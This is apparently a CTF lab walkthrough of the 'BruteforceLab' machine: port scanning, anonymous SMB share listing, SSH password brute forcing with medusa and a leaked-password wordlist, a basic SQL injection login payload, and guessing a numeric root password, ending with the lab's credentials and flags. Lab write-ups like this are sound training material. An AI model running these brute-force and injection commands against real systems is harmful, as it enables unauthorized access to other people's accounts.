+++
title = "BruteforceLab - Walkthrough"
date = "2026-07-31"
author = "nvru"
description = "Walkthrough for the BruteforceLab machine."
tags = [
  "ctf",
  "walkthrough",
  "linux",
  "webmin",
  "smb",
  "ssh",
  "bruteforce",
  "initial-access",
  "privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target Machine IP:** `10.10.10.3`

The objective was to enumerate the target machine, identify exposed services, gain initial access through SMB enumeration and SSH password brute forcing, and escalate privileges through weak credentials.

![Machine information](/images/hmv/bruteforcelab/vm.png)

---

## Port Scanning

### RustScan

```bash
rustscan -a 10.10.10.3 -- -sC -sV -A -oN nmap/rust
```

### Results

```text
PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
|   256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK94OoXaK+BKuXw2YeGlhV8wIhcK5uhHJoTWStinBxAY
10000/tcp open  http        syn-ack MiniServ 2.021 (Webmin httpd)
19000/tcp open  netbios-ssn syn-ack Samba smbd 4
19222/tcp open  netbios-ssn syn-ack Samba smbd 4
Service Info: OS: Linux
```

The discovered services were SSH, Webmin, and SMB. Further enumeration was performed to identify possible attack paths.

---

## Enumeration

### Webmin Enumeration

The first service checked was Webmin running on port `10000`.

![Web login page](/images/hmv/bruteforcelab/http.png)

The page contained a login form. After inspecting the source code, nothing useful was found except the authentication parameters:

```text
user
pass
```

![HTTP source code](/images/hmv/bruteforcelab/http_src.png)

While booting the machine, the GNOME Display Manager (GDM) login screen appeared. From there, I discovered the available users:

```text
mattia
andrea
```

![GDM users](/images/hmv/bruteforcelab/gdm_users.png)

Before attempting brute force, I tested several possible attack vectors against the Webmin login page. I started with a basic SQL injection payload:

```sql
' OR 1=1-- -
```

The payload was unsuccessful, so I continued enumeration through SSH and SMB.

---

### SMB Enumeration

The SMB services were enumerated using:

```bash
smbclient -L \\10.10.10.3 -p 19000 -N
```

A share named:

```text
Test
```

was discovered.

![SMB list 19000](/images/hmv/bruteforcelab/smd_list_19000.png)

The same SMB service was also checked on port `19222`:

```bash
smbclient -L \\10.10.10.3 -p 19222 -N
```

![SMB list 19222](/images/hmv/bruteforcelab/smd_list_19222.png)

Connecting to the SMB share revealed a README file:

```text
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

![README file 19000](/images/hmv/bruteforcelab/get_readme_19000.png)

![README file 19222](/images/hmv/bruteforcelab/get_readme_192222.png)

The README file mentioned Andrea, so I focused on this username for the next step.

---

## Initial Access

Using the recovered username, I attempted to brute force Andrea's SSH password:

```bash
medusa -h 10.10.10.3 -u andrea -P /opt/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt -M ssh -t 10
```

Valid credentials were discovered:

```text
Username: andrea
Password: awesome
```

![Medusa result](/images/hmv/bruteforcelab/medusa_andrea.png)

SSH access was successful:

```bash
ssh andrea@10.10.10.3
```

![SSH login](/images/hmv/bruteforcelab/ssh_andrea.png)

---

## Privilege Escalation

### andrea → mattia

The first thing checked after gaining access was sudo permissions.

```bash
sudo -l
```

![sudo permissions](/images/hmv/bruteforcelab/sudo_perm.png)

Andrea did not have sudo privileges.

I then checked Andrea's home directory and found the Bash history file.

![Andrea home](/images/hmv/bruteforcelab/andrea_home.png)

The history contained:

```bash
cd ..
nano passwords.txt
su -
```

![History nano passwords](/images/hmv/bruteforcelab/hist_nano_passwords.png)

The history also showed that Andrea moved into Mattia's directory and read a README file.

![History commands](/images/hmv/bruteforcelab/hist_cd_mattia.png)

I searched for the password file using:

```bash
find / -type f -name *.txt -ls 2>/dev/null
```

No useful files were discovered.

![Find results](/images/hmv/bruteforcelab/find_nothing.png)

I also searched specifically for:

```bash
find / -type f -name passwords.txt -ls
```

but no results were found.

---

### andrea → root

Because Andrea's Bash history showed an attempt to switch users:

```bash
su -
```

I suspected that the root password might be weak and reused.

I attempted to brute force the root password:

```bash
medusa -h 10.10.10.3 -u root -P /opt/wordlists/seclists/Passwords/Leaked-Databases/rockyou-75.txt -M ssh -r 1 -t 10
```

The attack was taking too long, so I tried a simpler approach using numeric passwords because this was a CTF environment.

![Brute force script](/images/hmv/bruteforcelab/script.png)

After running the script, the password was discovered:

```text
root:1998
```

I successfully switched to root:

```bash
su -
```

![Root login](/images/hmv/bruteforcelab/su_root.png)

The password `1998` was accepted for the root account, resulting in a root shell.

---

## Credentials

```text
andrea:awesome
root:1998
```

---

## Flags

```text
user:d5eb7d8b6f57c295e0bedf7eef531360

root:d2f74ec1ca3e40f6fa07f62d42eb9ea5
```
